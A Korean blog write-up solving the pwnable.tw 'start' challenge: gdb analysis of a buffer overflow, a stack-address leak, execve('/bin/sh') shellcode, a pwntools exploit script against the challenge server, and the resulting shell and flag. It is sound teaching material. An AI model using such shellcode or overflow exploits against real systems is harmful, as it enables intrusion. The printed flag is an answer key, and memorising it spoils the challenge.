---
title: "pwnable.tw - start"
date: 2020-09-18 10:42:00 -0400
categories: pwn/pwnable.tw
--- 

start
==
###### [pwnable.tw/start]
  
Overview
--
`start` 파일을 다운로드 받아서 실행하거나,  
`chall.pwnable.tw:10000`에 접속하면 다음과 같은 실행화면이 나옵니다.  
```
lucy@ubuntu:~/pwnable.tw/start$ ./start
Let's start the CTF:
```
  
`Let's start the CTF:`라는 문자열이 출력되고 입력값을 받은 후 종료되는 간단한 프로그램이에요!(첫 번째 문제라서 그런가봐요.)  
입력값을 길게 주면 `Segmentation fault`가 나고 비정상 종료하니깐 입력값을 잘 만들어서 리턴 주소를 덮는 문제인가? 생각을 하고 넘어갔어요.  
```
lucy@ubuntu:~/pwnable.tw/start$ ./start
Let's start the CTF:000000000000      
lucy@ubuntu:~/pwnable.tw/start$ ./start
Let's start the CTF:000000000000000000000
Segmentation fault (core dumped)
```
  
`checksec`으로 보호기법을 확인해보면 다음과 같이 나옵니다.  
아무것도 없어요!
```
lucy@ubuntu:~/pwnable.tw/start$ checksec --file=./start
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   8) Symbols	  No	0		0		./start
```
  
  
Analysis
--
`gdb`로 `start`파일을 열어봤어요.
```
lucy@ubuntu:~/pwnable.tw/start$ gdb -q ./start
pwndbg> disas main
No symbol table is loaded.  Use the "file" command.
```
  
`main` 어셈블리가 안나와서 일단 `start`로 실행해봤어요.  
  
```
pwndbg> start
Temporary breakpoint 1 at 0x8048060

Temporary breakpoint 1, 0x08048060 in _start ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0x0
 EDX  0x0
 EDI  0x0
 ESI  0x0
 EBP  0x0
 ESP  0xffffd210 ◂— 0x1
 EIP  0x8048060 (_start) ◂— push   esp
───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────
 ► 0x8048060 <_start>       push   esp
   0x8048061 <_start+1>     push   _exit <0x804809d>
   0x8048066 <_start+6>     xor    eax, eax
   0x8048068 <_start+8>     xor    ebx, ebx
   0x804806a <_start+10>    xor    ecx, ecx
   0x804806c <_start+12>    xor    edx, edx
   0x804806e <_start+14>    push   0x3a465443
   0x8048073 <_start+19>    push   0x20656874
   0x8048078 <_start+24>    push   0x20747261
   0x804807d <_start+29>    push   0x74732073
   0x8048082 <_start+34>    push   0x2774654c
───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ esp  0xffffd210 ◂— 0x1
01:0004│      0xffffd214 —▸ 0xffffd3c1 ◂— '/home/lucy/pwnable.tw/start/start'
02:0008│      0xffffd218 ◂— 0x0
03:000c│      0xffffd21c —▸ 0xffffd3e3 ◂— 'CLUTTER_IM_MODULE=xim'
04:0010│      0xffffd220 —▸ 0xffffd3f9 ◂— 0x435f534c ('LS_C')
05:0014│      0xffffd224 —▸ 0xffffd9e5 ◂— 'LESSCLOSE=/usr/bin/lesspipe %s %s'
06:0018│      0xffffd228 —▸ 0xffffda07 ◂— 'XDG_MENU_PREFIX=gnome-'
07:001c│      0xffffd22c —▸ 0xffffda1e ◂— '_=/usr/bin/gdb'
─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► f 0  8048060 _start
────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
``` 
  
입력받는 부분 보려고 `read`함수를 호출하는지 확인해봤는데요! 또 없어요.
```
pwndbg> disas read
No symbol table is loaded.  Use the "file" command.
```
함수 목록을 봤는데도 특별한게 없어서 일단 `_start`함수를 따라가 볼게요.
```
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
0xf7ffd990  __vdso_gettimeofday
0xf7ffda20  __vdso_time
0xf7ffda50  __vdso_clock_gettime
0xf7ffdaa0  __vdso_clock_gettime64
0xf7ffdad0  __vdso_clock_getres
0xf7ffdb50  __kernel_vsyscall
0xf7ffdb70  __kernel_sigreturn
0xf7ffdb80  __kernel_rt_sigreturn
pwndbg>
```
  
`_start`함수의 어셈블리를 보면 `syscall`을 이용해서 `write`를 호출한 후, `read`함수를 호출합니다.  
```
pwndbg> disas _start
Dump of assembler code for function _start:
=> 0x08048060 <+0>:	push   esp
   0x08048061 <+1>:	push   0x804809d
   0x08048066 <+6>:	xor    eax,eax
   0x08048068 <+8>:	xor    ebx,ebx
   0x0804806a <+10>:	xor    ecx,ecx
   0x0804806c <+12>:	xor    edx,edx
   0x0804806e <+14>:	push   0x3a465443
   0x08048073 <+19>:	push   0x20656874
   0x08048078 <+24>:	push   0x20747261
   0x0804807d <+29>:	push   0x74732073
   0x08048082 <+34>:	push   0x2774654c
   0x08048087 <+39>:	mov    ecx,esp
   0x08048089 <+41>:	mov    dl,0x14
   0x0804808b <+43>:	mov    bl,0x1
   0x0804808d <+45>:	mov    al,0x4
   0x0804808f <+47>:	int    0x80
   0x08048091 <+49>:	xor    ebx,ebx
   0x08048093 <+51>:	mov    dl,0x3c
   0x08048095 <+53>:	mov    al,0x3
   0x08048097 <+55>:	int    0x80
   0x08048099 <+57>:	add    esp,0x14
   0x0804809c <+60>:	ret    
End of assembler dump.
pwndbg> 
```

###### syscall read/write
```
ssize_t read(int fd, void *buf, size_t count);        // 시스템 콜 넘버 3번
ssize_t write(int fd, const void *buf, size_t count); // 시스템 콜 넘버 4번
```

###### Kernel Interface x86_32(i386) Linux system call convention
```
eax : syscall_number/return value
ebx ecx edx esi edi ebp 순서로 함수 인자가 들어간다!
all other registers are preserved across the int $0x80
```
`_start`어셈블리에서  `_start+39`부터 `_start_55`를 보고, 리눅스 시스템 콜 규약을 확인하면  
다음과 같이 호출함을 알 수 있습니다.
```
write(1, $esp , 0x14(20));
read(0, $esp, 0x3c(60));
```
여기서 `read` 시스템 콜을 통해 최대 `60Bytes`를 입력받고  
아래와 같이 종료 후에 `add   esp, 0x14`를 한 후 리턴합니다.  
즉, `esp+0x14` 주소에 위치한 `return address`를 덮어쓸 수 있어요!  
```
   0x08048091 <+49>:	xor    ebx,ebx
   0x08048093 <+51>:	mov    dl,0x3c
   0x08048095 <+53>:	mov    al,0x3
   0x08048097 <+55>:	int    0x80
   0x08048099 <+57>:	add    esp,0x14
   0x0804809c <+60>:	ret  
```

아까 `checksec` 결과 `NX Disabled`였기 때문에 쉘코드를 이용해서 문제를 풀게요!  
입력값을 어떻게 구성할지 보려고 `read` 시스템 콜 호출 직전에 브레이크 포인트를 걸었어요.
```
pwndbg> b *_start+55
Breakpoint 3 at 0x8048097
```
```
pwndbg> c
Continuing.
Let's start the CTF:
Breakpoint 3, 0x08048097 in _start ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
*EAX  0x3
 EBX  0x0
*ECX  0xffffd1f4 ◂— 0x2774654c ("Let'")
*EDX  0x3c
 EDI  0x0
 ESI  0x0
 EBP  0x0
*ESP  0xffffd1f4 ◂— 0x2774654c ("Let'")
*EIP  0x8048097 (_start+55) ◂— int    0x80
───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────
 ► 0x8048097 <_start+55>    int    0x80 <SYS_read>
        fd: 0x0
        buf: 0xffffd1f4 ◂— 0x2774654c ("Let'")
        nbytes: 0x3c
   0x8048099 <_start+57>    add    esp, 0x14
   0x804809c <_start+60>    ret    
 
   0x804809d <_exit>        pop    esp
   0x804809e <_exit+1>      xor    eax, eax
   0x80480a0 <_exit+3>      inc    eax
   0x80480a1 <_exit+4>      int    0x80
   0x80480a3                add    byte ptr [eax], al
   0x80480a5                add    byte ptr [eax], al
   0x80480a7                add    byte ptr [eax], al
   0x80480a9                add    byte ptr [eax], al
───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ ecx esp  0xffffd1f4 ◂— 0x2774654c ("Let'")
01:0004│          0xffffd1f8 ◂— 0x74732073 ('s st')
02:0008│          0xffffd1fc ◂— 0x20747261 ('art ')
03:000c│          0xffffd200 ◂— 0x20656874 ('the ')
04:0010│          0xffffd204 ◂— 0x3a465443 ('CTF:')
05:0014│          0xffffd208 —▸ 0x804809d (_exit) ◂— pop    esp
06:0018│          0xffffd20c —▸ 0xffffd210 ◂— 0x1
07:001c│          0xffffd210 ◂— 0x1
─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► f 0  8048097 _start+55
────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```
`read` 호출 전
```
pwndbg> x/30wx $esp
0xffffd1f4:	0x2774654c	0x74732073	0x20747261	0x20656874
0xffffd204:	0x3a465443	0x0804809d	0xffffd210	0x00000001
0xffffd214:	0xffffd3c1	0x00000000	0xffffd3e3	0xffffd3f9
0xffffd224:	0xffffd9e5	0xffffda07	0xffffda1e	0xffffda2d
0xffffd234:	0xffffda3e	0xffffda49	0xffffda66	0xffffda86
0xffffd244:	0xffffda9a	0xffffdaa8	0xffffdab3	0xffffdadc
0xffffd254:	0xffffdaed	0xffffdaf7	0xffffdb0e	0xffffdb20
0xffffd264:	0xffffdb41	0xffffdb97
```

`read` 호출 후
```
pwndbg> x/30wx $esp
0xffffd1f4:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd204:	0x41414141	0x42424242	0xffffd20a	0x00000001
0xffffd214:	0xffffd3c1	0x00000000	0xffffd3e3	0xffffd3f9
0xffffd224:	0xffffd9e5	0xffffda07	0xffffda1e	0xffffda2d
0xffffd234:	0xffffda3e	0xffffda49	0xffffda66	0xffffda86
0xffffd244:	0xffffda9a	0xffffdaa8	0xffffdab3	0xffffdadc
0xffffd254:	0xffffdaed	0xffffdaf7	0xffffdb0e	0xffffdb20
0xffffd264:	0xffffdb41	0xffffdb97
```

따라서 `dummy 20 Bytes` `return_addr` `shellcode`로 입력데이터를 구성해서 보내려고 합니다.  
이때, `return_addr`를 알기 위해서는 `esp`값을 알아야 합니다. `esp`값을 `leak`해서 `shellcode`주소를 `return_addr`에 넣어주어야 하는데요.    

쉘코드는 아래와 같이 했습니다. [여기 참고했어요!](http://shell-storm.org/shellcode/files/shellcode-827.php) 
```
xor   eax, eax
push  eax
push  0x68732f2f    # //sh -> hs//
push  0x6e69622f    # /bin -> nib/
mov   ebx, esp      # esp  -> "/bin/sh"
push  eax           
push  ebx           
mov   ecx, esp      # ecx -> argv
mov   edx, eax      # edx = NULL
mov   al, 0xb       # execve syscall number = 11
int   0x80
```
  
저는 메모리 leak 하는 부분이 헷갈려서 [이 블로그](https://34t3rnull.tistory.com/56)를 참고했어요!
```
pwndbg> 
0x0804809c in _start ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────
 EAX  0x19
 EBX  0x0
 ECX  0xffffd1f4 ◂— 0x41414141 ('AAAA')
 EDX  0x3c
 EDI  0x0
 ESI  0x0
 EBP  0x0
*ESP  0xffffd208 —▸ 0x8048087 (_start+39) ◂— mov    ecx, esp
*EIP  0x804809c (_start+60) ◂— ret    
───────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────
   0x8048091 <_start+49>    xor    ebx, ebx
   0x8048093 <_start+51>    mov    dl, 0x3c
   0x8048095 <_start+53>    mov    al, 3
   0x8048097 <_start+55>    int    0x80
   0x8048099 <_start+57>    add    esp, 0x14
 ► 0x804809c <_start+60>    ret             <0x8048087; _start+39>
    ↓
   0x8048087 <_start+39>    mov    ecx, esp
   0x8048089 <_start+41>    mov    dl, 0x14
   0x804808b <_start+43>    mov    bl, 1
   0x804808d <_start+45>    mov    al, 4
   0x804808f <_start+47>    int    0x80
───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────
00:0000│ esp  0xffffd208 —▸ 0x8048087 (_start+39) ◂— mov    ecx, esp
01:0004│      0xffffd20c —▸ 0xffffd20a ◂— 0xd20a0804
02:0008│      0xffffd210 ◂— 0x1
03:000c│      0xffffd214 —▸ 0xffffd3c1 ◂— '/home/lucy/pwnable.tw/start/start'
04:0010│      0xffffd218 ◂— 0x0
05:0014│      0xffffd21c —▸ 0xffffd3e3 ◂— 'CLUTTER_IM_MODULE=xim'
06:0018│      0xffffd220 —▸ 0xffffd3f9 ◂— 0x435f534c ('LS_C')
07:001c│      0xffffd224 —▸ 0xffffd9e5 ◂— 'LESSCLOSE=/usr/bin/lesspipe %s %s'
─────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────
 ► f 0  804809c _start+60
────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```
위에서 `ret`하면서 `0x8048087 <_start+39>    mov    ecx, esp`로 점프하면  
`esp`는 `0xffffd20c`가 됩니다.  
  
또한, 한 번 더 `write`함수를 호출할 때, 스택 주소를 `leak`할 수 있습니다.  
그 후에 `ecx` 변화없이 `read`함수를 호출하기 때문에 같은 위치에 쉘코드를 담은 입력 데이터를 입력할 수 있어요!  

  


Exploit Code
--
```
#!/usr/bin/python3

from pwn import *
r = remote("chall.pwnable.tw", 10000)
e = ELF("./start")

payload = "A"*20 + p32(0x8048087)
r.sendafter("CTF:", payload)
leak = r.recv()
stack_addr = u32(leak[0:4])
print("stack_addr @ " + hex(stack_addr))

payload2 = B*20
payload2 += p32(stack_addr + 0x14)
# shellcode
payload2 += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

r.send(payload2)
r.interactive()
```

  
  
결과화면
--
```
seonaelee@ubuntu:~/Downloads$ python ex.py 
[+] Opening connection to chall.pwnable.tw on port 10000: Done
[*] '/home/seonaelee/Downloads/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
stack_addr @ 0xfffc5c30
[*] Switching to interactive mode
$ id
uid=1000(start) gid=1000(start) groups=1000(start)
$ cat /home/start/flag
FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
```

  
  
